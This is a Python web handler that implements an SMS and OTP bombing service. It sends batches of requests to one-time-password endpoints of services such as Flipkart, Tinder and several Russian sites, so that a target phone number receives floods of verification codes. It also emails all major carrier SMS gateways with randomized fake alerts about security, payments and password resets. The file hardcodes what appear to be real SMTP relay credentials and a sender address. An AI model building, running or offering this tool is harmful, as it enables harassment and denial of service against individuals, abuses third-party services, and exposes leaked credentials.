from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError
import asyncio
import smtplib
from email.mime.text import MIMEText
import os
import random
import string
import time

# ── CARRIER SMS GATEWAYS ──
CARRIER_GATEWAYS = {
    'att':          'txt.att.net',
    'tmobile':      'tmomail.net',
    'verizon':      'vtext.com',
    'sprint':       'messaging.sprintpcs.com',
    'uscellular':   'email.uscc.net',
    'boost':        'sms.myboostmobile.com',
    'cricket':      'sms.cricketwireless.net',
    'metro':        'mymetropcs.com',
    'googlefi':     'msg.fi.google.com',
    'consumer':     'mailmymobile.net',
    'virgin':       'vmobl.com',
    'republic':     'text.republicwireless.com',
    'xfinity':      'vtext.com',
    'mint':         'tmomail.net',
    'visible':      'vtext.com',
    'straighttalk': 'vtext.com',
    'tracfone':     'mmst5.tracfone.com',
    'ting':         'message.ting.com',
    'cspire':       'cspire1.com',
    'spectrum':     'vtext.com',
}

# ── OTP ENDPOINTS ──
ENDPOINTS = [
    {"url": "https://www.flipkart.com/api/5/user/otp/generate", "method": "POST", "payload": {"loginId": "+{TARGET}"}},
    {"url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", "method": "POST", "payload": {"phone": "1{TARGET}"}},
    {"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en", "method": "POST", "payload": {"phone_number": "1{TARGET}"}},
    {"url": "https://youla.ru/web-api/auth/request_code", "method": "POST", "payload": {"phone": "+1{TARGET}"}},
    {"url": "https://api.ivi.ru/mobileapi/user/register/phone/v6", "method": "POST", "payload": {"phone": "1{TARGET}"}},
    {"url": "https://api.delitime.ru/api/v2/signup", "method": "POST", "payload": {"SignupForm[username]": "1{TARGET}", "SignupForm[device_type]": "3"}},
    {"url": "https://www.icq.com/smsreg/requestPhoneValidation.php", "method": "POST", "payload": {"msisdn": "1{TARGET}", "locale": "en", "k": "ic1rtwz1s1Hj1O0r", "r": "45559"}},
    {"url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/", "method": "POST", "payload": {"phone": "1{TARGET}", "device": "Windows+v.43+Chrome+v.7453451", "app_version": "870"}},
    {"url": "https://m.redbus.in/api/getOtp?number={TARGET}&cc=1&whatsAppOpted=false", "method": "GET", "payload": None},
    {"url": "https://my.newtonschool.co:443/api/v1/user/otp/?registration=true", "method": "POST", "payload": {"phone": "+1{TARGET}"}}
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

# ── RANDOMIZED SMS BODY GENERATOR ──
def gen_body():
    templates = [
        "Verification code: {c}. Do not share this with anyone.",
        "Your OTP is {c}. Valid for 5 minutes.",
        "Security alert: Unusual login detected. Code: {c}",
        "Account notification #{c} — action required.",
        "Confirm identity: {c}. Auto-generated message.",
        "Transaction ${a} pending. Ref: {c}",
        "{c} is your temporary access code.",
        "Delivery update — tracking: {c}",
        "Reminder: Appointment confirmed. Ref #{c}",
        "Payment of ${a} processed. Verify: {c}",
        "New sign-in from unknown device. Code: {c}",
        "Your account was accessed. Verify: {c}",
        "Password reset requested. Use code {c}",
        "Suspicious activity on your account. Code: {c}",
    ]
    c = ''.join(random.choices(string.digits, k=6))
    a = f"{random.randint(10,999)}.{random.randint(10,99)}"
    return random.choice(templates).format(c=c, a=a)

# ── EMAIL GATEWAY BOMBER ──
def email_bomb(target_digits, carrier_key, count=25):
    smtp_host = os.environ.get('SMTP_HOST', 'smtp-relay.brevo.com')
    smtp_port = int(os.environ.get('SMTP_PORT', 587))
    smtp_user = os.environ.get('SMTP_USER', 'a9b42a001@smtp-brevo.com')
    smtp_pass = os.environ.get('SMTP_PASS', 'xsmtpsib-a3692b403a15d3e0dd009ba04a5c536be98c197d166d5e7d70513cf7365425cf-2Czkr5c01XQHLgga')
    sender = os.environ.get('SENDER_EMAIL', 'retriontop@gmail.com')

    if not all([smtp_user, smtp_pass, sender]):
        return {'status': 'failed', 'error': 'SMTP credentials not configured'}

    # Determine targets — single carrier or shotgun
    if carrier_key == 'shotgun':
        targets = [f"{target_digits}@{gw}" for gw in CARRIER_GATEWAYS.values()]
        count_per = max(1, count // len(targets))
    else:
        gw = CARRIER_GATEWAYS.get(carrier_key)
        if not gw:
            return {'status': 'failed', 'error': f'Unknown carrier key: {carrier_key}'}
        targets = [f"{target_digits}@{gw}"]
        count_per = count

    results = []
    total_sent = 0

    try:
        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(smtp_user, smtp_pass)

        for to_addr in targets:
            for i in range(count_per):
                try:
                    msg = MIMEText(gen_body())
                    msg['From'] = sender
                    msg['To'] = to_addr
                    msg['Subject'] = ''
                    server.sendmail(sender, [to_addr], msg.as_string())
                    results.append({'seq': total_sent + 1, 'to': to_addr, 'status': 'sent'})
                    total_sent += 1
                    time.sleep(random.uniform(0.05, 0.25))
                except Exception as e:
                    results.append({'seq': total_sent + 1, 'to': to_addr, 'status': 'failed', 'error': str(e)})
                    total_sent += 1

        server.quit()
    except Exception as e:
        return {
            'status': 'partial',
            'error': f'SMTP error: {str(e)}',
            'messages_sent': sum(1 for r in results if r['status'] == 'sent'),
            'messages_total': total_sent,
            'results': results
        }

    sent_ok = sum(1 for r in results if r['status'] == 'sent')
    return {
        'status': 'complete',
        'mode': 'shotgun' if carrier_key == 'shotgun' else 'email',
        'targets_hit': list(set(t for t in targets)),
        'messages_sent': sent_ok,
        'messages_total': total_sent,
        'results': results
    }

# ── OTP FLOOD (existing logic) ──
async def send_otp_request(target, endpoint):
    try:
        url = endpoint["url"].replace("{TARGET}", target)
        method = endpoint["method"]
        data = None

        if method == "POST":
            payload_str = json.dumps(endpoint["payload"]).replace("{TARGET}", target)
            data = payload_str.encode('utf-8')

        req = urllib.request.Request(url, data=data, method=method)
        if method == "POST":
            req.add_header('Content-Type', 'application/json')

        req.add_header('User-Agent', random.choice(USER_AGENTS))
        req.add_header('Accept', '*/*')
        req.add_header('Connection', 'keep-alive')

        loop = asyncio.get_event_loop()
        def execute_request():
            with urllib.request.urlopen(req, timeout=5) as response:
                return response.getcode(), response.read().decode('utf-8', errors='ignore')

        status_code, body = await loop.run_in_executor(None, execute_request)
        return {"url": url, "status": "success", "code": status_code, "response": body}
    except HTTPError as e:
        error_body = e.read().decode('utf-8', errors='ignore')
        return {"url": endpoint["url"], "status": "failed", "code": e.code, "response": error_body}
    except Exception as e:
        return {"url": endpoint["url"], "status": "failed", "error": str(e)}

async def blast_target(target):
    tasks = []
    for _ in range(3):
        for endpoint in ENDPOINTS:
            tasks.append(send_otp_request(target, endpoint))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "success")
    return success_count, len(results), results


class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            body = json.loads(post_data.decode('utf-8'))

            target = body.get('target')
            mode = body.get('mode', 'otp')

            if not target:
                self._json(400, {'error': 'Target required'})
                return

            # Strip non-digit chars for email mode
            digits = ''.join(filter(str.isdigit, target))

            if mode == 'email' or mode == 'shotgun':
                carrier = body.get('carrier', 'shotgun') if mode != 'shotgun' else 'shotgun'
                count = min(int(body.get('count', 25)), 100)  # cap at 100
                result = email_bomb(digits, carrier, count)
                self._json(200, result)

            else:
                # OTP flood mode
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                success_count, total_count, details = loop.run_until_complete(blast_target(target))
                loop.close()

                self._json(200, {
                    'status': 'complete',
                    'mode': 'otp',
                    'target': target,
                    'requests_fired': total_count,
                    'successful_hits': success_count,
                    'message': f'OTP Flood complete. {success_count}/{total_count} payloads delivered.',
                    'details': details
                })

        except Exception as e:
            self._json(500, {'error': str(e)})

    def _json(self, code, data):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
